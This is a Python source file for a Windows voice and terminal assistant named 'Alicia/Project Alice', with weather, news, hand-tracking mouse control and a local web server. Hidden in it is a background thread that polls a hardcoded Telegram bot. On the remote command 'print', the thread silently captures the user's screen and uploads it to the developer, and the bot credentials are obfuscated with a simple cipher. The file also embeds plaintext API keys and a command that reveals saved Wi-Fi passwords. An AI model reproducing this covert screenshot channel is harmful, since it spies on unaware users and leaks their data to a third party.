





print("Loading...")

import msvcrt,os,sys,time
try:
    import mediapipe
except Exception as error_8:
    print(error_8)
    print('Installing mediapipe For the first time')
    os.system('py -m pip install mediapipe')
    time.sleep(3)
try:
    import ctypes
except Exception as error_9:
    print(error_9)
    print('Installing ctypes For the first time')
    os.system('py -m pip install ctypes')
    time.sleep(3)
try:
    import requests
except Exception as error_0:
    print(error_0)
    print('Installing requests For the first time')
    os.system('py -m pip install requests')
    time.sleep(3)
try:
    import threading
except Exception as error_1:
    print(error_1)
    print('Installing threading For the first time')
    os.system('py -m pip install threading')
    time.sleep(3)
try:
    import pyttsx3
except Exception as error_2:
    print(error_2)
    print('Installing pyttsx3 For the first time')
    os.system('py -m pip install pyttsx3')
    time.sleep(3)
try:
    import colorama
except Exception as error_13:
    print(error_13)
    print('Installing Windows Color APi For the first time')
    os.system('py -m pip install colorama')
    time.sleep(3)
try:
    import pyautogui
except Exception as error_3:
    print(error_3)
    time.sleep(1)
    print('Installing pyautogui For the first time')
    os.system('py -m pip install pyautogui')
    time.sleep(3)
try:
    import openai
    
except Exception as error_5:
    print(error_5)
    time.sleep(1)
    print('Installing openai For the first time')
    os.system('py -m pip install openai')
    time.sleep(3)
try:
    import webbrowser
except Exception as error_6:
    print(error_6)
    print('Installing webbrowser For the first time')
    os.system('py -m pip install webbrowser')
    time.sleep(3)
try:
    import tkinter
except Exception as error_7:
    print(error_7)
    print('Installing tkinter For the first time')
    os.system('py -m pip install tkinter')
    time.sleep(3)
try:
    import qrcode
except Exception as error_12:
    print(error_12)
    print('Installing qr code generator APi For the first time')
    os.system('py -m pip install qrcode[pil]')
    time.sleep(3)

try:
    import cv2
except Exception as error_14:
    print(error_14)
    print('Installing opencv APi For the first time')
    os.system('py -m pip install opencv-python')
    time.sleep(3)
try:
    import speech_recognition
except Exception as error_15:
    print(error_15)
    print('Installing speech_recognition APi For the first time')
    os.system('py -m pip install SpeechRecognition')
    time.sleep(3)
try:
    import microphone
except Exception as error_16:
    print(error_16)
    print('Installing speech_recognition APi For the first time')
    os.system('py -m pip install microphone')
    time.sleep(3)


import time
import sys
from colorama import colorama_text,Fore

def print_progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    sys.stdout.write(Fore.CYAN+'\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
    sys.stdout.flush()

def main23():
    total_iterations = 100

    for i in range(total_iterations + 1):
        time.sleep(0.005)  # Simulate some work being done
        print_progress_bar(i, total_iterations, prefix='Importing Libraries:', suffix='done', length=50)

main23()
 
from threading import Thread as th
import speech_recognition as sr
from pyautogui import screenshot as script
import cv2,os,time
import subprocess
import openai,webbrowser
import ctypes
import pyttsx3
import random
import socket
import win32api
import win32con
import qrcode
import requests,threading
import mediapipe as mp
from colorama import init, Fore, Back, Style
import tkinter as tk
from PIL import ImageTk, Image
engine = pyttsx3.init()
import datetime
rate = engine.getProperty('rate')
engine.setProperty('rate', 180)
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[1].id)



b=1
c=1
z=0
# variable x is for person identification
x=0
#color_codes1
meg=Fore.MAGENTA
red=Fore.RED
yel=Fore.YELLOW
gre=Fore.GREEN
cya=Fore.CYAN
blu=Fore.BLUE

l_meg=Fore.LIGHTMAGENTA_EX

l_red=Fore.LIGHTRED_EX
l_yel=Fore.LIGHTYELLOW_EX
l_gre=Fore.LIGHTGREEN_EX
l_cya=Fore.LIGHTCYAN_EX
l_blu=Fore.LIGHTBLUE_EX
l_whi=Fore.LIGHTWHITE_EX

def thumbnail(timer1):
    os.system('cls')
    print(Fore.CYAN+'Connection Initiated')
    print('\n\n\n')
    print(cya+' '*42+'/$$$$$$\ \$$$$$$$$$$\                      /$$$$$$$$$$//    ')
    time.sleep(timer1)
    print(' '*41+'/$$$$$$$$\ \$$$$$$$$$$\                    /$$$$$$$$$$//     ') 
    time.sleep(timer1)
    print(' '*40+'/$$$$/\$$$$\       \$$$$\                  /$$$$//       ')
    time.sleep(timer1)
    print(' '*39+'/$$$$// \$$$$\       \$$$$\                /$$$$//      ')
    time.sleep(timer1)
    print(blu+'         /'+'~'*28+'/$$$$//~~~\$$$$\~~~~~~~\$$$$\~~~~~~~~~~~~~~/$$$$//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//')
    time.sleep(timer1)
    print(blu+' '*8+'/'+' '*4+meg+'//'+'~~~~~~~~~~~~~~~~~~~~~~'+'/$$$$//~~~~~\$$$$\~~~~~~~\$$$$\~~~~~~~~~~~~/$$$$//~~~~~~~~~~/ /~~~~~~~~~~~~~~~~~// ')
    time.sleep(timer1)
    print(blu+'       /'+meg+'    //'+cya+'                      /$$$$//       \$$$$\       \$$$$\          /$$$$//          / /                 //  ')
    time.sleep(timer1)
    print(blu+'      /'+meg+'    //'+cya+'       /--------------/$$$$//---------\$$$$\-------\$$$$\--------/$$$$//----------/ /                 //   ')
    time.sleep(timer1)
    print(blu+'     /    '+meg+'//'+cya+'       / /------------/$$$$//-----------\$$$$\-------\$$$$\------/$$$$//------------/                 //    ')
    time.sleep(timer1)
    print(blu+'    /    '+meg+'//'+cya+'       / /            /$$$$//             \$$$$\       \$$$$\    /$$$$//                              //     ')
    time.sleep(timer1)
    print(blu+'   /'+meg+'    ~~~~~~~~~/ /~~~~~~~~~~~~/$$$$//~~~~~~~~~~~~~~~\$$$$\~~~~~~~\$$$$\~~/$$$$//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//      ')
    time.sleep(timer1)
    print(Fore.BLUE+'  /    '+'~'*24+'/$$$$//'+'~'*17+'\$$$$\~~~~~~~\$$$$\/$$$$//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//       ')
    time.sleep(timer1)
    print(Fore.CYAN+' /'+'$'*33+'//'+' '*19+'\$'+'$$$$$$$$$\ \$$$$$$$$//                                        ')
    time.sleep(timer1)
    print('/'+'$'*33+'//                     \$$$$$$$$$$\ \$$$$$$//          ')
    time.sleep(timer1)
thumbnail(0.02)
listener=False
print(l_cya+"\n\n\nHi, this is Alicia Mark 4 Data assistant program, please show your ID to open module")

#--------------------------------------------------------------------------------------------------------------------------------------------------------
MOUSEEVENTF_MOVE = 0x0001
MOUSE_EVENT_LEFTDOWN = 0x0002
MOUSE_EVENT_LEFTUP = 0x0004
def Aircontrol():
   
    
    global x_1,y_1
    
    print('To Activate Show the victory Sign')

    x_1=0
    y_1=0
    lock=0
    def click():
        global x_1,y_1
        # Set the cursor position
        #ctypes.windll.user32.SetCursorPos(x, y)
        if x_1==0:
            if lock==1:
            # Simulate the left mouse button down and up events
                # Sleep briefly to simulate a human-like click action
                if y_1==0:
                    win32api.mouse_event(MOUSE_EVENT_LEFTDOWN, 0, 0, 0, 0)
                    time.sleep(0.05)
                    win32api.mouse_event(MOUSE_EVENT_LEFTUP, 0, 0, 0, 0)
                    y_1=1
                else:
                    win32api.mouse_event(MOUSE_EVENT_LEFTDOWN, 0, 0, 0, 0)
                    time.sleep(0.05)  # Sleep briefly to simulate a human-like click action
                x_1=1
    def main():
        global x_1,y_1,lock
        cap = cv2.VideoCapture(0)
        mp_hands = mp.solutions.hands
        hands = mp_hands.Hands(static_image_mode=False, max_num_hands=1, min_detection_confidence=0.7, min_tracking_confidence=0.5)
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            results = hands.process(frame_rgb)
            #id=3(thumb point),id=4(thumb Tip)
            #id=5(Point finger bottom),id=6(Point finger 2nd bottom),id=7(Point finger 2nd top)
            if results.multi_hand_landmarks:
                for abhi in results.multi_hand_landmarks:
                    for id, lm in enumerate(abhi.landmark):
                        h, w, _ = frame.shape
                        cx, cy = int(lm.x * w), int(lm.y * h)
                        m=int(640-cx)*3-260
                        n=int(cy)*2
                        if id ==4 :  # Thumb Tip Landmark
                            a=cx
                            b=cy
                            cv2.circle(frame, (cx, cy), 8, (255, 0, 0), -1)
                            print(m,' x ',n)
                        elif id ==8 :  # Index finger tip landmark
                            cv2.circle(frame, (cx, cy), 8, (255, 255, 0), -1)
                            a1=cx
                            b1=cy
                            #print(a-a1)
                            if (b-b1)<=14 and (a-a1)<=14 :
                                if x_1==0:
                                    if lock==1:
                                        click()
                                        os.system('color 04')
                            else:
                                x_1=0
                                win32api.mouse_event(MOUSE_EVENT_LEFTUP, 0, 0, 0, 0)
                                os.system('color 03')
                        elif id==20:
                            cv2.circle(frame, (cx, cy), 8, (255, 0, 0), -1)
                            if lock==1:
                                ctypes.windll.user32.SetCursorPos(m,n)
                        elif id==16:
                            a2=cx
                            b2=cy
                            cv2.circle(frame, (cx, cy), 8, (255, 0, 0), -1)
                            if (b-b2)<=14 and (a-a2)<=14:
                                lock=1
                        cv2.imshow('Finger Tracking', frame)
            if cv2.waitKey(1) & 0xFF == 27:  # Press 'Esc' to exit
                break
        cap.release()
        cv2.destroyAllWindows()
    if __name__ == "__main__":
        main()
variable2=0
#--------------------------------------------------------------------------------------------------------------------------------------------------------
#Protocol Encryption 
def cypherx():
    global lock
    b_key=";RmnT3b!YvcYSExA@7DzWpUo9IQFi#Ou5yPt$G1ZrHe4XwqC:%M-. J6ClkjV2KhgB&8fNLd0sa/;RmnT3b!YvcYSExA@7DzWpUo9IQFi#Ou5yPt$G1ZrHe4XwqC:%M-. J6ClkjV2KhgB&8fNLd0sa/"
    list7=list(b_key)
    list5=[]
    t_key='3ELtb'
    list4=list(t_key)
    for j_key in range(0,len(list4)):
        list5.append(list7.index(str(list4[j_key])))
    lock=''
    
    for l_key in range(0,len(list4)):
        
        lock=str(lock)+list7[list5[l_key]-7]
cypherx()
a = ""
y=''
def sender(abhii,verma):
    #for Sending message to telegram bot
    #start-----------------------------------------------------------------------
    time.sleep(0.1)
    k=str(input("Type the message for Client: "))
    TOKEN = abhii
    CHAT_ID = verma
    MESSAGE = k
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': MESSAGE}
    response = requests.post(url, data=data)
    #print(response.json())
    try:
        print('Message Sent')
        print('_'*80,'\n\n')
        time.sleep(0.1)
        #end--------------------------------------------------------------------------
    except:
        print('Message Not Sent')
        print('Message Sent')
        print('_'*80,'\n\n')
        time.sleep(0.1)
def reciever(abhi1,verma1):
    
    
    time.sleep(0.1)
    #for Recieving Messages requests from telegram bot
    #start-------------------------------------------------------------------------------
    TOKEN = abhi1
    CHAT_ID = verma1
    url = f'https://api.telegram.org/bot{TOKEN}/getUpdates'
    response = requests.get(url)
    data = response.json()
    if data['result'][-1]['message']['text']=='shutdown':
      
        os._exit(1)

    else:
        return (data['result'][-1]['message']['text'])

    #end------------------------------------------------------------------------------------
def ftp(src,abhi2,verma2):
    
    TOKEN = abhi2
    CHAT_ID = verma2
    #for sending File to telegram bot from computer
    #start--------------------------------------------------------------------
    #for Sending file to telegram bot
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    file_path = src

    with open(file_path, "rb") as f:
        response = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
    #print(response.status_code)
   
    #end--------------------------------------------------------------------------
rule_book1=''
rule_book2=''
#encryption protocol1
b_key=";RmnT3b!YvcYSExA@7DzWpUo9IQFi#Ou5yPt$G1ZrHe4XwqC:%M-. J6ClkjV2KhgB&8fNLd0sa/;RmnT3b!YvcYSExA@7DzWpUo9IQFi#Ou5yPt$G1ZrHe4XwqC:%M-. J6ClkjV2KhgB&8fNLd0sa/"
list7_key=list(b_key)
list5_key=[]
t_key='Zuwn9wMwZK6UUW2mvUTOtK.Ynl'
list4_key=list(t_key)
for j_key in range(0,len(list4_key)):
    list5_key.append(list7_key.index(str(list4_key[j_key])))
keygen=''
#print("\n\nYour Decrypted word is = ",end="")
for l_key in range(0,len(list4_key)):
    keygen=keygen+str(list7_key[list5_key[l_key]-7])
keygen2=keygen+'fqKMae0iTtq0Ib1--xzE'
#encryption protocol2
b_key1=";RmnT3b!YvcYSExA@7DzWpUo9IQFi#Ou5yPt$G1ZrHe4XwqC:%M-. J6ClkjV2KhgB&8fNLd0sa/;RmnT3b!YvcYSExA@7DzWpUo9IQFi#Ou5yPt$G1ZrHe4XwqC:%M-. J6ClkjV2KhgB&8fNLd0sa/"
list7_key1=list(b_key1)
list5_key1=[]
t_key1='wSnuKSKfKK'
list4_key1=list(t_key1)
for j_key1 in range(0,len(list4_key1)):
    list5_key1.append(list7_key1.index(str(list4_key1[j_key1])))
keygen1=''
#print("\n\nYour Decrypted word is = ",end="")
for l_key1 in range(0,len(list4_key1)):
    keygen1=keygen1+str(list7_key1[list5_key1[l_key1]-7])
keygen3=keygen1
#print('This Section is for Developer\n')
url3= 'https://t.me/V_Alice_bot'
#print('Type (send) to send message\nType (get) for get message\nType (ftp) or (upload) for File Transfer\nType (open) for open bot domain ')


'''while True:
    abhii=str(input("\nabhishek:\metaserver\Listening..."))
    if abhii=='send':
        sender(keygen2,keygen3)
    elif abhii=='get':
        reciever(keygen2,keygen3)
    elif abhii=='ftp' or abhii=='upload':
        k=os.getcwd()
        folder_path = r"{}"
        n=folder_path.format(k)
        os.startfile(n)
        time.sleep(0.5)
        src=str(input("Drop the files here to save:"))
        ftp(src,keygen2,keygen3)
    elif abhii=='open':
        webbrowser.open_new_tab(url3)
        
    elif abhii=='close'or'exit':
        os.system('cls')
        os.system('color b')
        os.system('color b')
        break
    else:
        print("wrong input")
        os.system('color b')

'''    
engine.say('Welcome back Sir')
engine.runAndWait()

gateway_1=True
gateway_2=True
box_b='#$@#@#$@#$'

def reciever_live():
    global box_b,gateway_1
    TOKEN = '5910714156:AAEJdmAsoi6wR0MfqKMae0iTtq0Ib1--xzE'
    url = f'https://api.telegram.org/bot{TOKEN}/getUpdates'

    time.sleep(0.1)
    #for Recieving Messages requests from telegram bot
    #start-------------------------------------------------------------------------------
    
    response = requests.get(url)
    data = response.json()

    message_x=data['result'][-1]['message']['text']
    
    if message_x in box_b:
        pass

  
    else:
        if message_x=='Close':
            os.system('color 7')
            
            os._exit(1)
    
                        
        
        elif message_x=='Update':
            if gateway_2==True:

                print(l_yel+'Latest Version of this program is available\nSimply type update')
                gateway_2==False
        else:
            if  message_x=='print':
                
                gateway_1=False
                os.system("md tmp")

                myScript = script()
                myScript.save(r'tmp\\script.png')
                src=(r'tmp\script.png')
                ftp(src,keygen2,keygen3)
                try:
                    os.system('{}'.format('rmdir /s /q "tmp"'))
                    
                except:
                    pass
            else:

                gateway_1=True
        #print(Fore.LIGHTCYAN_EX+'Message from the developer:-',Fore.BLUE+message_x)
        box_b=message_x
    
        
def starter_1():
    while True:
        reciever_live()
        time.sleep(0.2)
    
x_start=th(target=starter_1)
x_start.start()
while True:
    char = msvcrt.getch()
    if char == b'\r': # Enter key
        os.system('exit')
    elif char == b'\x08': # Backspace key
        a = a[:-1]
        print("\b \b", end='', flush=True)
    else:
        if a==lock:
            break
        else:
            a += char.decode("utf-8")
            print('*', end='', flush=True)
if a==lock:
    print(gre+'\nLet me Check')

    try:

        base_url = "http://api.openweathermap.org/data/2.5/weather"
        params = {
            "q": "Bhopal",
            "appid": "0d0ead0cdd38d1765871b6757510a2ee",
            "units": "metric"  # You can change units to "imperial" for Fahrenheit
        }
        response = requests.get(base_url, params=params)
        #print(response.text)  # Print the API response for debugging purposes
        try:
            response.raise_for_status() 
            data = response.json()
            weather_description = data['weather'][0]['description']
            temperature = data['main']['temp']
            wind_speed=data['wind']['speed']
        except requests.exceptions.RequestException as e:
            print(f"Error fetching weather data: {e}")
    
        print('\n')
        print(meg+'_'*26)
        time.sleep(0.02)
        print(meg+'User Verified, WELCOME TO \\')
        time.sleep(0.02)
        print(meg+'PROJECT ALICE VERSION-4.2  \\',' '*40,Fore.LIGHTCYAN_EX+'',temperature,"°C",end=' / ')
        print(Fore.CYAN+'',weather_description,end=' / ')
        print(Fore.BLUE+'Air:',wind_speed,'kmph',Fore.WHITE+'')
        time.sleep(0.02)
        print(blu+'-'*120)
    except:
        print(red+'\nI think Internet is not Connected!')
        os.system('color 4')

    l=0
    time.sleep(0.02)
    print(cya+'Hi,i can help you to boost your learning and create your Notes and Research Papers as fast as Possible Type print to see')
    time.sleep(0.02)
    print('Type `index` for all commands/ Type `install` for installing libraries/ Type `extra` for extras/ type `close` to exit')
    
    os.system('title Project Aliciamark4.2')
    while z==0:
        variable_x=1
        print('To update the program type `update` or `website`'+meg+'________________________________________________________________________')
        time.sleep(0.02)
        print(cya+'To clear the screen type `cls` & `print` to see'+meg+'/                                                                        ')
        print(meg+'-----------------------------------------------                          ')
        time.sleep(0.02)
        print('                                                                                           ')
        time.sleep(0.02)
        print('                                                                                              ')
        time.sleep(0.02)
        empty_que=''
        empty_ans=''
        def autosave():
            f = open("aliciadata.txt", "a")
            for null_void in range(2):
                f.write('\n')
            f.write('Question:-   ')
            f.write(empty_que)
            for null_void1 in range(2):
                f.write('\n')
                time.sleep(0.01)
            f.write('Answers:-')
            for null_void2 in range(2):
                f.write('\n')
                time.sleep(0.01)
            f.write(empty_ans)
            f.write('\n')
            f.write('----------------------------------------------------------------------------------------------')
            f.close()
            time.sleep(0.1)
        try:
            def get_random_quote():
                url = 'https://zenquotes.io/api/random'
                response = requests.get(url)
                data = response.json()
                
                if data:
                    quote = data[0]['q']
                    author = data[0]['a']
                    return f'"{quote}" - {author}'
                else:
                    return "Failed to fetch a quote."
            if __name__ == '__main__':
                quote = get_random_quote()
                print('Quote of the day:',quote)
            
            for abhii25 in range(13):
                print(' ')
                time.sleep(0.02)
            print(cya+'Ask me anything\nType print to show previous history')
        except:
            print('Failed to fetch a quote.')
        '''def socket_connect():
            global msg
                
            #print('Client1','\n\n')
            #print('Connecting to the server')
            try:
                port=8305
                while True:
                    # create a socket object
                    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # get local machine name
                    host = socket.gethostname()
                    # connection to hostname on the port.
                    clientsocket.connect((host, port))
                    # Receive no more than 1024 bytes
                    msg_Encrypted = clientsocket.recv(1024)
                    msg=msg_Encrypted.decode('ascii')
                    #clientsocket.close()
                    print(msg)
                    print('\n','-'*70)
                    if msg=='green':
                        os.system('color 02')
                    elif msg=='blue':
                        os.system('color 03')
            except:
                time.sleep(0.02)
        th1=th(target=socket_connect)
        th1.start()'''
        


        while True:
            try:
                global abhii_input

                
                
                #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                
                time.sleep(0.02)
            except Exception as input_error:
                print(input_error)
            com=str(input(Fore.CYAN+'\n\Listening...'))
            abhii_input=com
            
            #abhii_input=str(input('\nListening...'))
            if abhii_input=='close':
                time.sleep(0.1)
                print(Fore.RED+'closing...')
                time.sleep(1)
                os.system('cls')
                os.system('title Command Prompt')
                os.system('color F')
                z=1
                os._exit(1)
                
            elif abhii_input=='news':
                try:
                    API_KEY = '710cda2eda484d05a505716d622950f1'
                    def get_top_headlines():
                        url = f'https://newsapi.org/v2/top-headlines?country=us&apiKey={API_KEY}'
                        response = requests.get(url)
                        data = response.json()
                        if data['status'] == 'ok':
                            articles = data['articles']
                            for idx, article in enumerate(articles, start=1):
                                print(f"{idx}. {article['title']} - {article['source']['name']}")
                                print(article['description'])
                                print(article['url'])
                                print('-' * 50,'\n\n')
                    if __name__ == '__main__':
                        print("Top Headlines:")
                        print('-' * 50)
                        get_top_headlines()
                except:
                    print('News Api Fetching Error')
            elif 'weather' in abhii_input:
                def get_weather(city, api_key):
                    base_url = "http://api.openweathermap.org/data/2.5/weather"
                    params = {
                        "q": city,
                        "appid": api_key,
                        "units": "metric"  # You can change units to "imperial" for Fahrenheit
                    }
                    response = requests.get(base_url, params=params)
                    #print(response.text)  # Print the API response for debugging purposes
                    try:
                        response.raise_for_status() 
                        data = response.json()
                        weather_description = data['weather'][0]['description']
                        temperature = data['main']['temp']
                        humidity = data['main']['humidity']
                        feels_like=data['main']['feels_like']
                        min_temp=data['main']['temp_min']
                        max_temp=data['main']['temp_max']
                        pressure_atm=data['main']['pressure']
                        wind_speed=data['wind']['speed']
                        print(Fore.CYAN+f"Weather in {city}: {weather_description}")
                        print(Fore.LIGHTCYAN_EX+f"Temperature: {temperature}°C")
                        print(Fore.LIGHTGREEN_EX+'Feels like: ',feels_like)
                        print(Fore.YELLOW+f"Humidity gm/m3: {humidity}%")
                        print(Fore.LIGHTRED_EX+'Min Temperature in Celcious: ',min_temp)
                        print(Fore.RED+'Max Temperature in Celcious: ',max_temp)
                        print(Fore.MAGENTA+'Pressure in hPa: ',pressure_atm)
                        print(Fore.BLUE+'Wind Avg Speed in kmph: ',wind_speed)
                        print('\nExtra Info:-\n')
                        for data_1 in data:
                            print(data_1,' : ',data[f'{data_1}'])
                            time.sleep(0.03)
                        print(Fore.CYAN+'')
                    except requests.exceptions.RequestException as e:
                        print(f"Error fetching weather data: {e}")
                if __name__ == "__main__":
                    city_name = input(Fore.BLUE+"Name of city: ")
                    api_key = "0d0ead0cdd38d1765871b6757510a2ee"  
                    get_weather(city_name, api_key)
            elif abhii_input=='send':
                sender(keygen2,keygen3)

            elif abhii_input=='send':
                sender(keygen2,keygen3)
            elif abhii_input=='get':
                print(reciever(keygen2,keygen3))
            elif abhii_input=='ftp' or abhii_input=='upload':
                k=os.getcwd()
                folder_path = r"{}"
                n=folder_path.format(k)
                os.startfile(n)
                time.sleep(0.5)
                src=str(input("Drop the files here to save:"))
                ftp(src,keygen2,keygen3)
            
            elif abhii_input=='open':
                webbrowser.open_new_tab(url3)
            elif com=='cls':
                os.system('cls')
            elif com=='airtouch':
                Aircontrol()
            elif com=='green':
                os.system('color a')
            elif com=='cyan' or com=='blue':
                os.system('color b')
            elif com=='white':
                os.system('color F')
            elif com=='':
                print('say something')
            elif com=='what is your name':
                print('thinking...\n')
                time.sleep(0.1)
                if x==0:
                    naam=input('i am Alicia version 4.4. What is your name? ')
                    print('Nice to meet you',naam)
                    engine.say("Nice to meet you"+naam)
                    engine.runAndWait()
                    x=1
                    l=1
                else:
                    print('Already told.')
                engine.say("Already told.")
                engine.runAndWait()
            elif com=='dir':
                os.system('dir')
                time.sleep(2)
            elif com=='ip':
                dir=input('type the command')
                os.system('ipconfig')
                time.sleep(0.1)
            elif com=='locate' or com=='location' or com=='open folder' or com=='show folder' or com=='show me the folder' :
                k3=os.getcwd()
                folder_path1 = r"{}"
                n2=folder_path1.format(k3)
                os.startfile(n2)
            elif com=='info':
                os.system('systeminfo')
                time.sleep(0.1)
            elif "qr code" in com or com=='scan':
                def create_qr_code(text, filename):
                    qr = qrcode.QRCode(
                        version=1,
                        error_correction=qrcode.constants.ERROR_CORRECT_L,
                        box_size=10,
                        border=4,
                    )
                    qr.add_data(text)
                    qr.make(fit=True)
                    img = qr.make_image(fill_color="black", back_color="white")
                    img.save(filename)
                if __name__ == "__main__":
                    input_text = input("Enter the text to encode as QR code: ")
                    output_filename = input("Enter the output filename (e.g., output.png): ")
                    create_qr_code(input_text, output_filename+'.jpg')
                    print(f"QR code saved as {output_filename}.jpg")
                    time.sleep(0.5)
                    current_directory = os.getcwd()
                    image_filename = "{}.jpg".format(output_filename) 
                    image_path = os.path.join(current_directory, image_filename)
                    try:
                        image = Image.open(image_path)
                        image.show()
                    except Exception as e:
                        print("An error occurred:", e)


            
        
            elif com=='extra':
                print("There are some extra simple codes added for just for testing purpose\n")
                print("admin\nsnap\nmovie\nupdate\nwebsite\nlocation")
            elif com=='server' or com=='host' or com=='share':
                batch_content = """
                @echo off
                FOR /F "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /C:"IPv4 Address"') do set "ip=%%A"
                set ip=%ip:~1%
                echo %ip%

                """
                file_name = "ip.bat"
                # Open the file in write mode and write the batch content
                with open(file_name, "w") as batch_file:
                    batch_file.write(batch_content)
                time.sleep(0.5)
                batch_file_name = file_name
                # Run the batch file using subprocess and capture the output
                completed_process = subprocess.run(batch_file_name, text=True, capture_output=True)
                # Get the captured standard output
                output = completed_process.stdout
                # Print the captured output
                set_port=random.randrange(8000,9000)
                server_ip=f'{output}:{set_port}/'
                print(f'Your Server Host Url = {server_ip}')
                print('Starting server:-')
                print('\nScan this Qr-code to connect device')
                time.sleep(1)
                def create_qr_code1(text, filename):
                    qr = qrcode.QRCode(
                        version=1,
                        error_correction=qrcode.constants.ERROR_CORRECT_L,
                        box_size=10,
                        border=4,
                    )
                    qr.add_data(text)
                    qr.make(fit=True)
                    img = qr.make_image(fill_color="black", back_color="white")
                    img.save(filename)
                if __name__ == "__main__":
                    input_text = server_ip
                    output_filename = 'localip'
                    create_qr_code1(input_text, output_filename+'.jpg')
                    time.sleep(0.2)
                    current_directory = os.getcwd()
                    image_filename = "{}.jpg".format(output_filename) 
                    image_path = os.path.join(current_directory, image_filename)
                    try:
                        image = Image.open(image_path)
                        image.show()
                    except Exception as e:
                        print("An error occurred:", e)
                os.system('start cmd /K py -m http.server {}'.format(set_port))

            
            
            
            
            
            
            
            
            
            elif com=='update':
                print("Check the Download Folder, After Downloaded")
                url1= 'https://drive.google.com/uc?id=1Oximsfq9ib8D1hkXBHX7OsGjf-Ek2JO-&export=download'
                webbrowser.open_new_tab(url1)
            elif com=='website':
                print("Opening website")
                url2= 'https://abhi639679.wixsite.com/abhishek'
                webbrowser.open_new_tab(url2)
            elif com=='search':
                while True:
                    b12=str(input('Search in Browser = '))
                    n12='youtube'
                    if n12 in b12:
                        m12='https://www.youtube.com/results?search_query='+b12[0:]
                        webbrowser.open_new_tab(m12)
                    elif b12=='close':
                        break
                    else:
                        x12='https://www.google.com/search?q='+b12
                        
                        webbrowser.open_new_tab(x12)
        
            
        
                                            
            #wifi password finder
            elif com=='wifi':
                os.system('netsh wlan show profile')
                wifi=input('type the wifi name from user profiles.(case Sensitive)')
                print('Check key content in security settings = wifi password')
                time.sleep(3)
                os.system('netsh wlan show profile '+wifi+' key=clear')
                time.sleep(0.1)
            elif com=='cmd':
                os.system('start cmd')
            #main admin codes run in cmd
            


            elif com=='speak'or com=='say' or com=='tell':
                engine.say(alice_ai)
                engine.runAndWait()
            elif com=='history' or com=='print':
                
                print(Fore.LIGHTWHITE_EX+'')
                os.system('type aliciadata.txt')     
                
                print('\nScroll-Up ^')
            elif com=='track my hands':
                Aircontrol()
                
            elif com=='shutdown':
                dir=input('yes/no')
                if dir=='yes':
                    os.system('shutdown/s')
                    print('shutting down the system')
                else: time.sleep(0.1)
            elif com=='index':
                pyautogui.press('f11')
                os.system('start cmd')
                time.sleep(0.1)
                print('_'*26)
                time.sleep(0.03)
                print(cya+'DEVELOPER: ABHISHEK VERMA \\')
                time.sleep(0.03)
                print(cya+'PROJECT ALICE VERSION-4.5  \\'+'_'*128)
                time.sleep(0.03)
                print(l_cya+'`'*156)
                time.sleep(0.01)
                print('attrib      = display file attributes',end='')
                time.sleep(0.01)
                print('                         pause       = pauses the execution of a batch file and shows a message')
                print('call        = calls a batch file from another one',end='')
                time.sleep(0.01)
                print('             pause       = pauses the execution of a batch file and shows a message')
                print('cd          = change directory',end='')
                time.sleep(0.01)
                print('                                runas       = start a program as another user')
                print('cls         = clear screen',end='')
                time.sleep(0.01)
                print('                                    rmdir / rd  = delete directory')
                print('cmd         = start command prompt',end='')
                time.sleep(0.01)
                print('                            replace     = replace files')
                print('copy/xcopy  = copy files',end='')
                time.sleep(0.01)
                print('                                      rename      = rename files')
                print('compact     = display/change file compression',end='')
                time.sleep(0.01)
                print('                 reg         = add/read/import/export registry entries')
                print('comp        = compare file contents',end='')
                time.sleep(0.01)
                print('                           route       = display network routing table, add static routes/type route print for print')
                print('chkntfs     = display/change volume check at startup',end='')
                time.sleep(0.01)
                print('          shutdown    = shutdown the computer')
                print('chkdsk      = check volumes',end='')
                time.sleep(0.01)
                print('                                   sort        = sort the screen output')
                print('driverquery = display installed devices and their properties',end='')
                time.sleep(0.01)
                print('  systeminfo  = displays computer-specific properties and configurations')
                print('diskpart    = volume management',end='')
                time.sleep(0.01)
                print('                               tracert     = trace routes similar to patchping')
                print('defrag      = defragment media',end='')
                time.sleep(0.01)
                print('                                taskkill    = terminate a process or a application')
                print('diskcopy    = copy floppy disc to another one',end='')
                time.sleep(0.01)
                print('                 tasklist    = display applications and related task')
                print('diskcomp    = compare content of two floppy disks',end='')
                time.sleep(0.01)
                print('             time        = display/edit the system time')
                print('dir         = list directory content',end='')
                time.sleep(0.01)
                print('                          timeout     = wait any time')
                print('echo        = text output',end='')
                time.sleep(0.01)
                print('                                     title       = set title for prompt')
                print('expand      = extract files',end='')
                time.sleep(0.01)
                print('                                   type        = display content of text files')
                print('erase / del = delete one or more files',end='')
                time.sleep(0.01)
                print('                        tree        = display folder structure graphically')
                print('exit        = exits the command prompt or a batch file',end='')
                time.sleep(0.01)
                print('        tftp        = transfer files to a TFTP server')
                print('find        = find files',end='')
                time.sleep(0.01)
